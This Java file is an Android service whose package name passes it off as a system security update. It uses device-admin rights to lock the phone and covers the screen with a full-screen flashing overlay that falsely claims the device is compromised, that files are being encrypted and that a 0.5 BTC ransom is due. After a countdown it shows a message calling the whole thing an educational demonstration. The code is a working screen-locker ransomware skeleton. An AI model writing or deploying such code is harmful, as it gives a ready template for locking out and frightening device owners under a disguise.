package com.android.security.update;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

public class DeviceLockService extends Service {
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private WindowManager windowManager;
    private View overlayView;
    private Handler handler;
    private int secondsLeft = 60;

    @Override
    public void onCreate() {
        super.onCreate();
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MaliciousDeviceAdmin.class);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        handler = new Handler();
        startDeviceLock();
    }

    private void startDeviceLock() {
        devicePolicyManager.lockNow();
        createSystemOverlay();
        startCountdown();
    }

    private void createSystemOverlay() {
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        );
        
        params.gravity = Gravity.TOP;

        LayoutInflater inflater = LayoutInflater.from(this);
        overlayView = inflater.inflate(R.layout.lock_screen, null);
        windowManager.addView(overlayView, params);
    }

    private void startCountdown() {
        final TextView countdownText = overlayView.findViewById(R.id.countdownText);
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (secondsLeft > 0) {
                    updateLockScreen(countdownText);
                    secondsLeft--;
                    handler.postDelayed(this, 1000);
                } else {
                    unlockDevice();
                }
            }
        }, 1000);
    }

    private void updateLockScreen(TextView textView) {
        String message = "🚨 CRITICAL SECURITY ALERT 🚨\\n\\n" +
                       "YOUR DEVICE HAS BEEN LOCKED\\n\\n" +
                       "Time remaining: " + secondsLeft + " seconds\\n\\n" +
                       "⚠️  SYSTEM COMPROMISED\\n" +
                       "📱 DEVICE: LOCKED\\n" +
                       "🔒 ENCRYPTION: IN PROGRESS\\n" +
                       "💰 RANSOM: 0.5 BTC REQUIRED\\n\\n" +
                       "Educational demonstration!\\n" +
                       "DO NOT POWER OFF";
        
        textView.setText(message);
        
        if (secondsLeft % 2 == 0) {
            overlayView.setBackgroundColor(0xFFFF0000);
        } else {
            overlayView.setBackgroundColor(0xFF000000);
        }
    }

    private void unlockDevice() {
        if (overlayView != null) {
            windowManager.removeView(overlayView);
        }
        showEducationalMessage();
        stopSelf();
    }

    private void showEducationalMessage() {
        View eduView = LayoutInflater.from(this).inflate(R.layout.educational_screen, null);
        TextView eduText = eduView.findViewById(R.id.educationalText);
        
        String lesson = "✅ EDUCATIONAL DEMONSTRATION COMPLETE\\n\\n" +
                       "📚 WHAT JUST HAPPENED:\\n" +
                       "• You opened a malicious file\\n" +
                       "• It gained device admin rights\\n" + 
                       "• It locked your device completely\\n" +
                       "• Real malware would demand money\\n\\n" +
                       "🚨 REAL MALWARE COULD:\\n" +
                       "• Encrypt all your files\\n" +
                       "• Steal personal data\\n" +
                       "• Demand Bitcoin payment\\n" +
                       "• Damage your device\\n\\n" +
                       "🛡️  PROTECT YOURSELF:\\n" +
                       "• Never open suspicious files\\n" +
                       "• Use antivirus software\\n" +
                       "• Download from trusted sources\\n" +
                       "• Keep system updated";
        
        eduText.setText(lesson);
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );
        
        windowManager.addView(eduView, params);
        handler.postDelayed(() -> windowManager.removeView(eduView), 15000);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
